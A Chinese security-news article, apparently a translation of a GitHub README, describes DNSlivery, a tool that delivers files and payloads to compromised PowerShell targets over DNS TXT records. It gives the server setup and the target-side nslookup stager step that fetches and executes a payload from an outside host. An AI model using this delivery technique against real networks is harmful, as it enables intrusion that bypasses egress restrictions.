##  前言

 **DNSlivery是一款使用DNS作为传输协议将文件传递到目标的工具。**

##  **特点**  

> 1.执行或上传文件到目标机器
>
> 2.目标上的不需要任何客户端
>
> 3.不需要完整的DNS服务器

![](https://image.3001.net/images/20190830/1567133611_5d688fab74c5d.gif!small)

它可以轻松地将文件或payload传送到受损目标，不需要使用传统的Web传输，无需专用客户端软件。这适用于禁止传出Web流量的受限环境。  

![](https://image.3001.net/images/20190830/1567133618_5d688fb2c6900.png!small)

虽然现在已经存在更完整的DNS隧道工具（比如
[dnscat2](https://github.com/iagox86/dnscat2)和[iodine](https://code.kryo.se/iodine/)），它们都需要在目标上运行专用客户端。问题是DNS可能没有其他办法在这种受限制的环境中提供客户端。换句话说，使用这些工具构建DNS通信通道需要已具有DNS通信通道。

相比之下，DNSlivery仅提供从服务器到目标的单向通信，但不需要任何专用客户端来执行此操作。因此，如果您需要通过DNS构建可靠的双向通信通道，请使用DNSlivery为您的目标提供更高级的DNS隧道工具的客户端。

##  它是如何工作的？

与大多数DNS隧道工具一样，DNSlivery使用TXT记录以base64表示形式存储文件内容。但是，它不需要设置完整的DNS服务器。相反，它使用[scapy](https://scapy.net/)库来侦听传入的DNS数据包并制作所需的响应。

![](https://image.3001.net/images/20190830/1567133629_5d688fbd1d04f.png!small)

由于大多数文件不适合单个TXT记录，DNSlivery将创建包含该文件的base64块的多个有序记录，上面的图示出了输送第二命名的文件的块file。

为了检索所有base64块并将它们重新组合在一起而不需要在目标上使用专用客户端，DNSlivery将为每个文件生成：

> 1.一个明文发送器
>
> 2.一个base64编码stager

![](https://image.3001.net/images/20190830/1567133638_5d688fc673b67.png!small)

需要这两个阶段的交付过程来向stager添加功能（处理丢失的DNS响应），否则这些功能将不适合单个TXT记录。

###  关于目标兼容性的注意

目前，仅支持PowerShell目标。但是，可以改进DNSlivery以支持其他目标，例如bash或python。如果这是您希望实现的功能，请告诉我[@
no0be](https://twitter.com/no0be)。

##  要求

DNSlivery不需要构建复杂的服务器基础结构。实际上，只有两个简单的要求：

> 1.能够NS在您的公共DNS区域中创建记录
>
> 2.拥有一台能够从Internet 接收流量的Linux服务器,开放udp/53

##  DNS

第一步是通过NS在域中创建新记录，将子域委派给将运行DNSlivery的服务器。作为示例，我创建了以下记录以将子域委托dnsd.no0.be给服务器vps.no0.be。

    
    
    dnsd    IN  NS vps.no0.be.

如果您的区域由第三方提供商管理，请参阅其文档以创建NS记录。

##  DNSlivery

运行DNSlivery的唯一要求是python3它的scapy库。

    
    
    git clone https://github.com/no0be/DNSlivery.git &&  CD DNSliverypip install -r requirements.txt

##  用法

###  服务器

DNSlivery将为给定目录的所有文件提供服务（pwd默认情况下），并且需要以root权限运行s以侦听传入的udp/53数据包。

    
    
    usage: dnslivery.py [-h] [-p PATH] [-s SIZE] [-v] interface domain nameserverDNSlivery - Easy files and payloads delivery over DNSpositional arguments:  interface             interface to listen to DNS traffic  domain                FQDN name of the DNS zone  nameserver            FQDN name of the server running DNSliveryoptional arguments:  -h, --help            show this help message and exit  -p PATH, --path PATH  path of directory to serve over DNS (default: pwd)  -s SIZE, --size SIZE  size in bytes of base64 chunks (default: 255)  -v, --verbose         increase verbosity

示例：

    
    
    $ sudo python3 dnslivery.py eth0 dnsd.no0.be vps.no0.be -p /tmp/dns-deliveryDNSlivery - Easy files and payloads delivery over DNS[*] File "file" ready for delivery at file.dnsd.no0.be (7 chunks)[*] Listening for DNS queries...

**关于文件名规范化的注意**

由于允许域名的字符集比UNIX文件名更具限制性（根据[RFC1035](https://tools.ietf.org/html/rfc1035#section-2.3.1)），DNSlivery将在需要时执行规范化。

示例：

    
    
    [*] File "My Awesome Powershell Script ;).ps1" ready for delivery at my-awesome-powershell-script----ps1.dnsd.no0.be (1891 chunks)

请注意，当前的规范化代码并不完美，因为它不会考虑重叠的文件名或大小限制。

###  目标

在目标上，首先通过请求其专用记录来检索所需文件的启动器TXT。支持以下三个启动器：

行动  |  发射台  |  描述  
---|---|---  
输出  |  [filename].print.[domain]  |  （默认）将传送的文件打印到控制台  
执行  |  [filename].exec.[domain]  |  执行传递的文件  
保存  |  [filename].save.[domain]  |  将传递的文件保存到磁盘  
      
    
    nslookup -type = txt [filename].[stager].[domain]

然后，只需将DNS响应中引用的启动器复制并粘贴到PowerShell控制台即可检索目标上的文件。

示例：

![](https://image.3001.net/images/20190830/1567133650_5d688fd2d91ed.gif!small)

参考来源：[GitHub](https://github.com/no0be/DNSlivery)，FB小编周大涛编译，转载请注明来自FreeBuf.COM

  

